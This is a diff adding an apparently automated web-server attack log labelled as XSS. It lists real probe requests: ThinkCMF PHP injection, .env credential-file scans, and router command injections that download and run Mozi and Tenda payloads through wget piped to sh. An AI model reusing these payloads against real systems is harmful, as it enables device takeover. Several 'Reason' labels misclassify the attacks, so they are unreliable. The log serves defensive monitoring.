@@ -1,0 +1,43 @@
+Attack Cross-Site Scripting (xss)
+
+	### Impact 5
+	45.146.165.157 - - [28/Mar/2021:18:43:57 +0200] 'GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1' 200 209 '-' 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'
+	Reason: 'Detects self-executing JavaScript functions'
+
+	45.148.10.45 - - [29/Mar/2021:08:30:41 +0200] 'GET /goform/setUsbUnload/.js?deviceName=A;wget%20http%3A//dns.cyberium.cc/script/tenda%20-O-|sh HTTP/1.1' 404 497 '-' 'python-requests/2.22.0'
+	Reason: 'Detects basic obfuscated JavaScript script injections'
+
+	45.146.165.157 - - [29/Mar/2021:10:15:51 +0200] 'GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1' 200 209 '-' 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'
+	Reason: 'Detects self-executing JavaScript functions'
+
+	45.146.165.165 - - [30/Mar/2021:03:49:33 +0200] 'GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1' 200 290 '-' 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'
+	Reason: 'Detects self-executing JavaScript functions'
+
+	45.146.165.165 - - [31/Mar/2021:04:36:19 +0200] 'GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1' 200 290 '-' 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'
+	Reason: 'Detects self-executing JavaScript functions'
+
+	45.146.165.165 - - [01/Apr/2021:00:09:49 +0200] 'GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1' 200 301 '-' 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'
+	Reason: 'Detects self-executing JavaScript functions'
+
+	35.166.114.225 - - [01/Apr/2021:05:41:57 +0200] 'GET /vendor/.env HTTP/1.1' 404 441 '-' 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36'
+	Reason: 'Detects basic obfuscated JavaScript script injections'
+
+	35.166.114.225 - - [01/Apr/2021:05:41:57 +0200] 'GET /storage/.env HTTP/1.1' 404 441 '-' 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36'
+	Reason: 'Detects basic obfuscated JavaScript script injections'
+
+	35.166.114.225 - - [01/Apr/2021:05:41:58 +0200] 'GET /public/.env HTTP/1.1' 404 441 '-' 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36'
+	Reason: 'Detects basic obfuscated JavaScript script injections'
+
+	45.146.165.165 - - [01/Apr/2021:13:27:21 +0200] 'GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1' 200 290 '-' 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'
+	Reason: 'Detects self-executing JavaScript functions'
+
+	178.175.97.162 - - [02/Apr/2021:06:48:16 +0200] 'GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.97.162:32827/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0' 404 455 '-' '-'
+	Reason: 'Detects JavaScript location/document property access and window access obfuscation'
+
+	45.146.165.165 - - [02/Apr/2021:11:45:38 +0200] 'GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1' 200 290 '-' 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'
+	Reason: 'Detects self-executing JavaScript functions'
+
+	49.89.22.241 - - [02/Apr/2021:15:00:13 +0200] 'GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0' 404 455 '-' '-'
+	Reason: 'Detects JavaScript location/document property access and window access obfuscation'
+
+	45.155.205.151 - - [03/Apr/2021:05:24:29 +0200] 'GET /?a=fetch
